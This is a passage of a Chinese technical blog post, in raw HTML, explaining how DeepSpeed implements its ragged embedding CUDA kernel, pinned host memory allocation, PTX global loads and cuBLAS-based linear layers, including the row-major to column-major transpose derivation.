batch.</span><br><span class="hljs-string">        embedding_weight (torch.Tensor): Embedding table of shape [vocab_size, embed_dim]</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    self.kernel(embedded_tokens, ragged_wrapper.input_ids(),<br>                embedding_weight, position_embed_weight, position_embed_offset,<br>                ragged_wrapper.batch_metadata_buffer(), ragged_wrapper.inflight_seq_descriptors(),<br>                ragged_wrapper.tokens_to_seq(), ragged_wrapper.kv_ptrs())<br>    <span class="hljs-keyword">return</span> embedded_tokens<br></code></pre></td></tr></table></figure><hr><p>在开始看 C++ 实现之前，我想带大家先回顾一下 embedding 的计算方式，避免被代码绕晕。</p><p>NLP 中的 Embedding 原理就是将文本编码为紧凑的高维向量。而为了将原先文本中 token 的 one-hot 编码转换成更紧凑稠密的高维向量，往往需要做一次矩阵乘法：如下图所示例子，利用稠密的浮点向量来表示每个 token，再利用向量间的余弦值来表示词义关系。</p><p><img src="/img/LLM/tokenEmbeddingExample.png" alt=""></p><p>因为注意力机制无法发现词序关系，LLM 中还更多地加入了位置编码，比如 transformer 论文中经典的 sin-cos 位置函数表示词序位置，他们计算后会直接加到 embedding 向量中。</p><h3 id="C-实现">C++ 实现</h3><p>前面提到，对于 <code>DSRaggedEmbedding</code> 中维护的 embedding 相关的张量，他们在主机上也相应地维护了一个 shadow 张量。这些 shadow 张量是在构造 ragged embedding 时直接填充的。在条件允许的前提下，应分配 shadow 张量，以方便张量快速复制到 GPU 上。因此，我们需要尽可能地降低主机到 GPU 的数据传输延迟，来看看 DeepSpeed 是如何实现的：</p><h4 id="快速分配主机内存">快速分配主机内存</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span>* <span class="hljs-title">get_cuda_fast_buffer</span><span class="hljs-params">(<span class="hljs-type">int64_t</span> size)</span> </span>&#123;<br>    <span class="hljs-type">void</span>* buffer_ptr;<br>    <span class="hljs-comment">// Host allocation flags that should minimize the host -&gt; accelerator copy latency</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> alloc_flags =<br>        cudaHostAllocPortable | cudaHostAllocMapped | cudaHostAllocWriteCombined;<br>    <span class="hljs-built_in">cudaHostAlloc</span>(&amp;buffer_ptr, size, alloc_flags);<br>    <span class="hljs-keyword">return</span> buffer_ptr;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中：</p><ul><li><code>cudaHostAllocPortable</code> 该 flag 要求返回的主机内存将被<strong>所有CUDA context</strong>视为 pinned memory，而不仅仅执行了分配内存的那个 context。这里与 <code>cudaMallocHost()</code> 有点区别，<a href="https://forums.developer.nvidia.com/t/cudamallochost-vs-cudahostalloc-cudahostallocportable/30274">参看 NVIDIA 社区解答</a></li><li><code>cudaHostAllocMapped</code> 该 flag 要求分配的空间必须映射到 CUDA 地址空间中，并且设备内存指针可以被 <code>cudaHostGetDevicePointer()</code> 来调用得到。</li><li><code>cudaHostAllocWriteCombined</code> 该 flag 要求分配的内存必须执行组合写(Write-Combined)策略。在某些系统配置上，WC 内存可以通过 PCI Express 总线更快地传输，但大多数 CPU 无法有效地读取。对于那些 CPU 写入，设备通过 pinned memory 或主机-&gt;设备传输读出的操作来说，WC 内存是一个很好的选择。</li></ul><h4 id="ragged-embed">ragged_embed</h4><p>接下来我们来看被封装的 <code>ragged_embed</code> C++ 代码。参考上文给出的 Embedding 原理示例，可以很清楚地明白各个变量的含义。在使用了 <code>DISPATCH_FOR_FLOAT</code> 和 <code>DISPATCH_FOR_INT</code> 这两个宏做变量类型的定义后，CUDA 代码被正式启动了。</p><p><img src="/img/LLM/ragged_embed_code.png" alt="ragged_embed 代码"></p><h4 id="ragged-embed-CUDA-kernel">ragged embed CUDA kernel</h4><p>使用 CUDA 加速程序计算，首先要明确如何安排我们手中的大量线程。从之前的 Embedding 示例中，敏感的读者已经注意到，只需要按照 <code>input_ids</code> 内值读取 <code>embedding_weight</code> 的那一行就行了，不需要真的去计算矩阵乘。因此事实上 CUDA 程序需要注意的根本不是计算，而是读取和写入。</p><p>DeepSpeed 是这样安排他们的线程的。首先，让每个线程负责 load <code>embedding_weight</code> 矩阵中一行的一小块颗粒（红圈部分），这一颗粒大小被定义为 <code>embed::granularity = 16</code> 个字节。而一个线程块内有 512 个线程，因此一个线程块可以 load 一共 512 * 16 个字节的数据。对应的，一个 token 的向量维度有 <code>embed_dim</code>，所以需要 <code>parallel_blocks</code> 个线程块 load。这组成了线程块排布的 x 方向，一行 x 方向的线程块完成一个 token 的向量读取，而 y 方向的线程块数量对应着 token 的总数。</p><p><img src="/img/LLM/launch_ragged_embed_kernel.png" alt="launch_ragged_embed_kernel"></p><p><img src="/img/LLM/ragged_embed_kernel.png" alt="ragged_embed_kernel"></p><p>用之前的 Embedding 举例，要处理 “I have four tokens” 这句话，首先找到了这句话对应 token 的行号，填入 <code>input_ids</code> 为 [3, 1, 4, 2]。CUDA 程序执行时，会产生四行 x 方向的线程块，其中第一行的所有线程块负责从 <code>embedding_weight</code> 中装载第 3 行（对应 <code>token_value</code>）的所有数据，读入到输出的 <code>embedded_tokens</code> 矩阵中的第 1 行（对应 <code>token_idx</code>）。</p><h4 id="数据读取与写入">数据读取与写入</h4><p>现在我们来看一下该 kernel 的性能情况。由于整个 kernel 几乎没有运算，因此主要的瓶颈必然发生在读写数据上，为了尽可能快地将数据读入和写出，DeepSpeed 安排 warp 内的线程读取了连续的 32 * 16 = 512 个字节的数据。整数倍的内存读取容易实现 cacheline 的对齐。</p><p>而对于下面这个 API 则大有学问。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// usage</span><br>mem_access::<span class="hljs-built_in">load_global</span>&lt;embed::granularity&gt;(reg_buf, embedding_row + channel_offset)<br><br><span class="hljs-comment">// declaration</span><br><span class="hljs-keyword">template</span> &lt;<span class="hljs-type">int</span> AccessSize, LoadPolicy policy = LoadPolicy::CacheAll&gt;<br>__device__ __forceinline__ <span class="hljs-type">void</span> <span class="hljs-built_in">load_global</span>(<span class="hljs-type">void</span>* dst, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* src);<br><br><span class="hljs-comment">// definition</span><br><span class="hljs-keyword">template</span> &lt;&gt;<br>__device__ __forceinline__ <span class="hljs-type">void</span> <span class="hljs-built_in">load_global</span>&lt;<span class="hljs-number">16</span>&gt;(<span class="hljs-type">void</span>* dst, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* src)<br>&#123;<br>    uint4* data = <span class="hljs-built_in">reinterpret_cast</span>&lt;uint4*&gt;(dst);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTX_AVAILABLE</span><br>    <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;ld.global.ca.v4.u32 &#123;%0, %1, %2, %3&#125;, [%4];\n&quot;</span></span></span><br><span class="hljs-params"><span class="hljs-function">                 : <span class="hljs-string">&quot;=r&quot;</span>(data[<span class="hljs-number">0</span>].x), <span class="hljs-string">&quot;=r&quot;</span>(data[<span class="hljs-number">0</span>].y), <span class="hljs-string">&quot;=r&quot;</span>(data[<span class="hljs-number">0</span>].z), <span class="hljs-string">&quot;=r&quot;</span>(data[<span class="hljs-number">0</span>].w)</span></span><br><span class="hljs-params"><span class="hljs-function">                 : <span class="hljs-string">&quot;l&quot;</span>(src))</span></span>;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-type">const</span> uint4* src_cast = <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">const</span> uint4*&gt;(src);<br>    data[<span class="hljs-number">0</span>] = src_cast[<span class="hljs-number">0</span>];<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br><br><span class="hljs-comment">// the uint4 definition</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">__device_builtin__</span> __builtin_align__(<span class="hljs-number">16</span>) uint4<br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> x, y, z, w;<br>&#125;;<br></code></pre></td></tr></table></figure><p><code>uint4</code> 表示 4 个 <code>unsigned int</code> 变量按照 16 个字节对齐的方式排布在内存中，总共有 16 个字节大小，正好对应了之前 embed 移动的颗粒度，因此 <code>load_global</code> 在实现时直接使用了 <code>uint4</code> 进行数据搬运。而对应到 PTX 汇编代码，有若干不同的模板实例化来实现：</p><ul><li>ld.global.ca.v4.u32 Cache at all levels 所有缓存上都过一遍</li><li>ld.global.cg.v4.u32 CacheGlobal  Cache at L2 only 仅在 L2 缓存上存放</li><li>ld.global.cs.v4.u32 CacheStreaming Cache with evict first policy 使用优先驱逐的方式缓存。即先后读入的数据入流水一般从缓存走过，但片叶不沾身，尽量不影响 cache 其他的数据</li></ul><h2 id="线性层计算">线性层计算</h2><p>看完 embedding 层的计算后，我们顺着数据流动的方向，来看一下 QKV 需要经过的线性层计算。说到底，线性层计算其实就是简单的矩阵相乘，那么在 CUDA 平台上，调用 cublas 接口完成矩阵乘无疑是最方便也是最高效的选择了 😃。</p><h3 id="BlasFPLinear">BlasFPLinear</h3><p>DeepSpeed 中选择使用 <code>BlasFPLinear</code> 类完成 cublas 接口的调用和封装。该类涉及到其他的三个类：<code>CUDAGatedActivation</code> <code>CUDABiasActivation</code> 和 <code>BlasLibLinear</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">BlasFPLinear</span>(<span class="hljs-title class_ inherited__">DSLinearBase</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Linear DSModule based on BLAS library and standalone bias + activation kernel implementation.</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, config: DSLinearConfig, implementation_config: <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">super</span>().__init__(config, implementation_config)<br>        self._linear_impl = BlasLibLinear(self._config.input_dtype)<br>        <span class="hljs-keyword">if</span> is_gated(config.activation):<br>            self._is_gated = <span class="hljs-literal">True</span><br>            self._act_fn = CUDAGatedActivation(config.out_channels, config.output_dtype, config.activation)<br>            self._double_buffer = torch.empty((config.max_tokens, config.out_channels * <span class="hljs-number">2</span>),<br>                                              dtype=config.output_dtype,<br>                                              device=get_accelerator().current_device())<br>        <span class="hljs-keyword">else</span>:<br>            self._is_gated = <span class="hljs-literal">False</span><br>            self._act_fn = CUDABiasActivation(config.out_channels, config.output_dtype, config.activation)<br>        self._output = torch.empty((config.max_tokens, config.out_channels),<br>                                   dtype=config.output_dtype,<br>                                   device=get_accelerator().current_device())<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, hidden_states: torch.Tensor, w: torch.Tensor, b: <span class="hljs-type">Optional</span>[torch.Tensor] = <span class="hljs-literal">None</span></span>) -&gt; torch.Tensor:<br>        output = empty_from(self._output, (hidden_states.shape[<span class="hljs-number">0</span>], self._config.out_channels))<br>        <span class="hljs-keyword">if</span> self._is_gated:<br>            staging_output = empty_from(self._double_buffer, (hidden_states.shape[<span class="hljs-number">0</span>], self._config.out_channels * <span class="hljs-number">2</span>))<br>            self._linear_impl(staging_output, hidden_states, w)<br>            self._act_fn(output, staging_output, b)<br>        <span class="hljs-keyword">else</span>:<br>            self._linear_impl(output, hidden_states, w)<br>            self._act_fn(output, b)<br>        <span class="hljs-keyword">return</span> output<br></code></pre></td></tr></table></figure><p>先从最简单的 <code>BlasLibLinear</code> 开始吧，它调用了 C++ 函数 <code>void blas_linear(at::Tensor&amp; output, at::Tensor&amp; hidden_states, at::Tensor&amp; weights)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">BlasLibLinear</span>(<span class="hljs-title class_ inherited__">DSKernelBase</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, fp_dtype: DtypeEnum</span>):<br>        self.inf_module = InferenceCoreBuilder().load()<br>        self.inf_module.create_handle()<br>        self.kernel = self.inf_module.blas_linear<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__call__</span>(<span class="hljs-params">self, output: torch.Tensor, hidden_states: torch.Tensor, weights: torch.Tensor</span>) -&gt; torch.Tensor:<br>        self.kernel(output, hidden_states, weights)<br>        <span class="hljs-keyword">return</span> output<br></code></pre></td></tr></table></figure><p>然后是<code>CUDABiasActivation</code>，它调用了 C++ 函数 <code>bias_activation</code>；<code>CUDAGatedActivation</code> 调用了 <code>ds_gated_activation</code>。</p><h4 id="C-实现-2">C++ 实现</h4><p>因为 cublas 中做矩阵运算时，通常会采用列主序（column-major）的方式，而 python C++ 中我们已经习惯使用了行主序的方式排布矩阵，因此在运算前需要对矩阵做一定的转换，因此矩阵的维度在这里会有点混乱，让我们好好捋一捋。</p><p>首先输入的 hidden_states 的矩阵 H 维度是 (num_tokens, hidden_size)，那么 weights 矩阵的维度就应该是 (head_dims * head_size, hidden_size)，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>H</mi><mo>×</mo><msup><mi>W</mi><mi>T</mi></msup></mrow><annotation encoding="application/x-tex">H\times W^T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8413em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span></span></span> 就是结果。<strong>但由于 cublas 采用了列主序，因此我们传入的矩阵给 cublas 使用时，实际上输入的都是这个矩阵的转置！当然，得到的结果也是这个矩阵的转置</strong>。</p><blockquote><p>以下是推导过程，设 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>H</mi><mi>c</mi></msub></mrow><annotation encoding="application/x-tex">H_c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 是 cublas 看到的矩阵H，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>W</mi><mi>c</mi></msub></mrow><annotation encoding="application/x-tex">W_c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 是 cublas 看到的矩阵weights，那么有</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>H</mi><mi>c</mi></msub><mo>=</mo><msup><mi>H</mi><mi>T</mi></msup></mrow><annotation encoding="application/x-tex">H_c=H^T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8913em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span></span></span></span></p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>W</mi><mi>c</mi></msub><mo>=</mo><msup><mi>W</mi><mi>T</mi></msup></mrow><annotation encoding="application/x-tex">W_c=W^T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8913em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span></span></span></span></p><p>但因为得到的结果也是要转置的。于是</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>H</mi><mo>×</mo><msup><mi>W</mi><mi>T</mi></msup><mo>=</mo><mo stretchy="false">(</mo><msubsup><mi>H</mi><mi>c</mi><mi>T</mi></msubsup><mo>×</mo><msub><mi>W</mi><mi>c</mi></msub><msup><mo stretchy="false">)</mo><mi>T</mi></msup><mo>=</mo><msubsup><mi>W</mi><mi>c</mi><mi>T</mi></msubsup><mo>×</mo><msub><mi>H</mi><mi>c</mi></msub><mo>=</mo><mi>W</mi><mo>×</mo><msup><mi>H</mi><mi>T</mi></msup></mrow><annotation encoding="application/x-tex">H\times W^T=(H_c^T\times W_c)^T=W_c^T\times H_c=W\times H^T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8913em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1413em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.453em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1413em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1383em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.453em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8913em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span></span></span></span></p></blockquote><p>于是，输入到 cublas 计算 gemm 的公式应当变成 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>W</mi><mo>×</mo><msup><mi>H</mi><mi>T</mi></msup></mrow><annotation encoding="application/x-tex">W\times H^T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8413em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span></span></span>。这就解释了下图中的红框部分计算 m n 和 k 的代码。又因为实际 cublas 是要计算 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msubsup><mi>W</mi><mi>c</mi><mi>T</mi></msubsup><mo>×</mo><msub><mi>H</mi><mi>c</mi></msub></mrow><annotation encoding="application/x-tex">W_c^T\times H_c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0883em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-2.453em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.0813em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span 